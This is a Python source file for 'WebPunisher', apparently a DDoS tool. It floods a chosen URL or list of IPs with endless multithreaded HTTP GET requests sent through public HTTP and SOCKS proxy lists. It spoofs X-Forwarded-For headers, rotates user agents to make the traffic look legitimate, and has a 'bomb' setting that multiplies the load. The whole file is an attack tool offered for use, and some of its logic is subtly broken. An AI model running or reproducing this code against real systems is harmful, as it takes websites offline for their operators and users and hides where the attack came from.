import socket
import traceback
import socks
import threading
import random
import requests
import re
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

red = "\033[1;91m"
green = "\033[1;92m"
white = "\033[1;97m"
orange = "\033[1;31m"
end = "\033[1;92m"

design = f"{orange}█████{white}█████{green}█████{end}"

print(Fore.RED + """

 _       __     __    ____              _      __             
| |     / /__  / /_  / __ \__  ______  (_)____/ /_  ___  _____
| | /| / / _ \/ __ \/ /_/ / / / / __ \/ / ___/ __ \/ _ \/ ___/
| |/ |/ /  __/ /_/ / ____/ /_/ / / / / (__  ) / / /  __/ /    
|__/|__/\___/_.___/_/    \__,_/_/ /_/_/____/_/ /_/\___/_/     

[+] WebPunisher
[+] Dev: Ph.Sk1d
""")


useragents = open('ua.txt', 'r+').read().splitlines()

http_proxies = requests.get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.split("\n")
socks4_proxy = requests.get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt").text.split("\n")
socks5_proxy = requests.get(
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt").text.split("\n")


def Main_Menu():  # in This Function Septum The Url To Make It Usable For The FutureSetting Of HttpRequests
    global url
    global url2
    global urlport
    global choice
    global ips
    global threads
    global multiple
    global use_proxy
    global anonymity
    global socks_mode
    global proxy_mode

    use_proxy, proxy_mode = False, False

    URL_REGEX = r'http[s]?:\/\/([\w]*[\.])*[a-z0-9]+\.\w+'
    IP_REGEX = r"[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}\.[\d]{0,3}"

    print("\033[92m")

    try:
        while True:
            try:
                choice = int(input(Fore.RED + "Do you want one target [0] or more[1]: "))
            except ValueError:
                print(f"{red}Use integers Only!!!{end}")
            if choice == 1:
                ip_file = input("Insert txt file of ips ")
                ips = open(ip_file).readlines()
                break
            elif choice == 0:
                while True:             # Automatically detect whether input is IP or URL
                    url = input("[+] Enter Target Url: ").strip()
                    if re.match(URL_REGEX, url):
                        break
                    elif re.match(IP_REGEX, url):
                        break
                    else:
                        print(f"{red} invalid target.")

                url2 = re.split(r"://", url)[1]

                try:
                    urlport = url.split(":")[2] # directly get port if exist
                except:
                    urlport = "80"

                break # Gets out of Loop
            else:
                print(f"{red}Invalid Options!!!{end}")
    except KeyboardInterrupt:
        print(f"{red}KeyboardInterrupt Detected, Exiting...{end}")
        exit()
    except Exception as e:  # If something goes wrong
        print(f"{red}Error: {e}{end}")

    while True:
        anonymous = input(Fore.RED + "\nDo you want to use SOCKS4/5 or proxy [y/n] > ").lower()
        if anonymous == "y":
            use_proxy = True
            try:
                while True:
                    type = int(input(Fore.RED + "Choose [0] for SOCKS4/5 or [1] proxy > "))
                    if type == 0:
                        socks_mode = True
                        sock_type = int(input(Fore.RED + "Choose [0] for SOCKS4 or [1] for SOCKS5 > "))
                        if sock_type == 0:
                            anonymity = socks4_proxy
                            break
                        elif sock_type == 1:
                            anonymity = socks5_proxy
                            break
                        else:
                            print(f"{red}You mistyped, try again.")
                    elif type == 1:
                        proxy_mode = True
                        anonymity = http_proxies
                        break
                    else:
                        print(f"{red}You mistyped, try again.")

            except TypeError:
                print(f"{red}please enter integers only;") 
            break

        elif choice == "n":
            use_proxy = False
            break

        else:
            print("You mistyped, try again.")

    try:
        threads = int(input(Fore.RED + "Insert number of threads (800): "))
    except ValueError:
        threads = 800
        print(Fore.RED + "800 threads selected.\n")

    while True:
        try:
            multiple = int(input(Fore.RED + "Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
            break
        except ValueError:
            print("You mistyped, try again.\n")

    try:
        input(f"{red}PRESS ANY KEY TO CONTINUE OR CTRL+C TO CANCEL > {end}")
        start_attack()
    except KeyboardInterrupt:
        print("\n\n\033[91mCanceled!\033[0m")

def start_attack():
    try:
        global acceptall
        global connection

        acceptall = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ] # Header Accept at random to make the requests look more legitimate
        # the Keep Alive always is useful to LOL
        connection = "Connection: Keep-Alive\r\n"  #ThanksTherunixx,MyFriend

        ThreadPool = ThreadPoolExecutor(max_workers=threads)
        if use_proxy: # If we have chosen the proxying mode
            if proxy_mode: # And we chose the HTTP Proxy
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestProxyHTTP(i+1).launch) # Start the special class                   
                        # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                # for i in range(threads):
                #     threads_init[i].start() 
            elif socks_mode: # If we have chosen the SOCKS
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestSocksHTTP(i+1).launch) # Start the special class                    
                    # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                    # This starts threads as soon as they are all ready
            else: # otherwise send normal non -proxate requests.
                with ThreadPool as executor:
                    for i in range(threads):
                        executor.submit(RequestDefaultHTTP(i+1).launch) # Start the special class                    
                    # This starts threads as soon as they are all ready
                    print(f"{ThreadPool._max_workers} Threads initialized")
                #This starts threads as soon as they are all ready
    except Exception as e:
        print(traceback.print_exc())

class RequestProxyHTTP:  #The Multithreading class

    def __init__(self, counter):  # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable        
        self.counter = counter

    def launch(self):# the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            random.choice(useragents) + "\r\n"  # scelta useragent a caso
        accept = random.choice(acceptall)  # scelta header accept a caso
        randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
            "." + str(random.randint(0, 255)) + "." + \
            str(random.randint(0, 255))
        # X-forward-for, a HTTP Header that allows you to increase anonymity (see Google for info)
        forward = "X-Forwarded-For: " + randomip + "\r\n"
        if choice == "1":
            ip = random.choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + forward + connection + "\r\n" # Here is the Final Request
        # wait for threads to be ready
        while True:  # infinite loop
            proxy = random.choice(anonymity).strip().split(":")
            try:
                # Here is our socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connection to the proxy
                s.connect((str(proxy[0]), int(proxy[1])))
                #Encode In Bytes Della Richiest a HTTP
                s.send(str.encode(request))
                # Print of requests
                print(Fore.RED + "Sending Request ")
                # current+=1
                try:  # Send other requests in the same thread
                    for y in range(multiple):  # multiplication factor
                        # encode In Bytes DellaRichiest a HTTPtaHttp
                        s.send(str.encode(request))
                        # current+=y
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except:
                s.close() # If something goes wrong, closes the socket and the cycle starts again

class RequestSocksHTTP:# The Multithreading class
    def __init__(self, counter):  # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
        self.counter = counter

    def launch(self):  # the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            random.choice(useragents) + "\r\n"  # READY PROXY CHOICE
        accept = random.choice(acceptall) # CHOICE CHOICE A random
        if choice == "1":
            ip = random.choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + \
            connection + "\r\n" # Final Request Composition      
        # wait for threads to be ready
        while True:
            proxy = random.choice(anonymity).strip().split(":")
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(
                    proxy[1]), True)  # Command to Proxat us with the SOCKS
                s = socks.socksocket() # Socket creation with pysocks
                s.connect((str(url2), int(urlport)))  # connection
                s.send(str.encode(request)) # Send
                #PrintReq +Counter
                print(Fore.RED + "\nRequest sent from {proxy[0]+':'+proxy[1]} >> {self.counter}")
                try:  #Send other requests in the same thread
                    for y in range(multiple): # Multiplication factor
                        # Encode in bytes of the HTTP request
                        s.send(str.encode(request))
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except: # If something goes wrong, this Except closes the socket and connects to the Try below
                s.close() # Closes Socket
                try: # the Try tries to see if the error is caused by the type of Errata SOCKS, in fact try with SOCKS4
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(
                        proxy[0]), int(proxy[1]), True)# Test with SOCKS4
                    s = socks.socksocket() # Creation New Socket
                    s.connect((str(url2), int(urlport))) # connection
                    s.send(str.encode(request)) # Send
                    # print req + counter
                    print(Fore.RED + "Sending request" +
                            str(proxy[0]+":"+proxy[1]) + ">> ", self.counter)
                    try: # Send other requests in the same thread
                        for y in range(multiple):# Multiplication factor
                            # encode in bytes della richiesta HTTP
                            s.send(str.encode(request))
                    except:  # If something goes wrong, closes the socket and the cycle starts again
                        s.close()
                except:
                    print("Sock down. Trying request again.", self.counter)
                    # If not even with that Try he managed to send anything, then the SOCK is down and closes the socket.
                    s.close()


class RequestDefaultHTTP: # The Multithreading class

    def __init__(self, counter): # Function put on practically only for the Threads Counter.The Council of the Function passes, passes the X+1 above as the Counter variable
        threading.Thread.__init__(self)
        self.counter = counter

    def launch(self): # the function that gives the instructions to the various threads
        useragent = "User-Agent: " + \
            random.choice(useragents) + "\r\n" # Useragent Case
        accept = random.choice(acceptall)  # accept a case
        if choice == "1":
            ip = random.choice(ips)
            get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        else:
            get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        request = get_host + useragent + accept + \
            connection + "\r\n"  #Final Request composition
        #wait for threads to be ready        
        while True:
            try:
                # socket creation
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(url2), int(urlport)))  #connection
                s.send(str.encode(request))  #sending
                print(Fore.RED + "Request has been sent! ", self.counter)  # printReq +Counter
                try:  # Send other requests in the same thread
                    for y in range(multiple):  #multiplication factor
                        # encode in bytes della richiesta HTTP
                        s.send(str.encode(request))
                except:  # If something goes wrong, closes the socket and the cycle starts again
                    s.close()
            except:  #If something goes wrong
                s.close()  # Closes Socket and starts again


if __name__ == '__main__':
# This starts the first function of the program, which in turn starts another one, then another, up to the attack.
    Main_Menu()